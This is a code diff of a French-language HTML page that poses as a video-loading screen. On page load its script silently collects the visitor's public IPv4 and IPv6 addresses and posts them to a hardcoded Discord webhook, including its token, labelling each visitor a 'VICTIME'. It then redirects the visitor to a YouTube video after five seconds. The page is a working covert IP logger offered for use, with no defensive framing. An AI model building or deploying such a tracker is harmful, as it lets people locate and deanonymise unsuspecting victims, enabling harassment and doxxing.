@@ -1,43 +1,50 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"></head><body>
-<div style="background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:20%;font-size:22px">
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Chargement...</title>
+  <style>
+    body{background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:20%}
+    .l{border:12px solid #333;border-top:12px solid #f00;border-radius:50%;width:70px;height:70px;animation:s 1s linear infinite;margin:0 auto 20px}
+    @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+  <div class="l"></div>
   <h1>Veuillez patienter 5 secondes...</h1>
-  <p>Chargement de la vidéo...</p>
-</div>
+  <p>Redirection en cours</p>
 
 <script>
-// === CHANGE UNIQUEMENT TON WEBHOOK ICI ===
+// ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+// METS TON WEBHOOK DISCORD ICI (c’est LA SEULE CHOSE à changer)
 const webhook = "https://discord.com/api/webhooks/1439673608225034240/QCmvEWzJGk21ZF8AkeiNvW9cXtWFPZ3Pf-x-2rFj68OP8boHo51qHIF6ez1mmMD5KG77";
+// ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
 
-// Récupération IPv4 + IPv6 publique en parallèle (les 2 services les plus fiables 2025)
 Promise.all([
-  fetch("https://api.ipify.org?format=json").then(r=>r.json()).catch(()=>{}),
-  fetch("https://api6.ipify.org?format=json").then(r=>r.json()).catch(()=>{})
-]).then(([ipv4data, ipv6data]) => {
-  const ipv4 = ipv4data?.ip || "non détectée";
-  const ipv6 = ipv6data?.ip || "non détectée (ou désactivée)";
-
+  fetch("https://api.ipify.org?format=json").then(r=>r.json()),
+  fetch("https://api6.ipify.org?format=json").then(r=>r.json()).catch(()=> ({ip:"non détectée"}))
+]).then(([v4, v6]) => {
   fetch(webhook, {
     method: "POST",
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify({
-      username: "IP Logger Pro",
-      avatar_url: "https://i.imgur.com/2h5tRAb.png",
-      content: "",
       embeds: [{
-        title: "NOUVELLE VICTIME",
         color: 16711680,
-        description: `**IPv4 publique :** \`${ipv4}\`\n**IPv6 publique :** \`${ipv6}\``,
-        footer: {text: "Clic détecté • 2025"}
+        title: "VICTIME",
+        description: 
+`IP: IPv4 \`${v4.ip}\`
+IP: v6 \`${v6.ip}\`
+IP: IPpublic \`${v4.ip}\``,
+        timestamp: new Date().toISOString()
       }]
     })
   });
 });
 
-// Redirection après 5 secondes
 setTimeout(() => {
   location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 }, 5000);
 
 </script>
-</body></html>
+</body>
+</html>
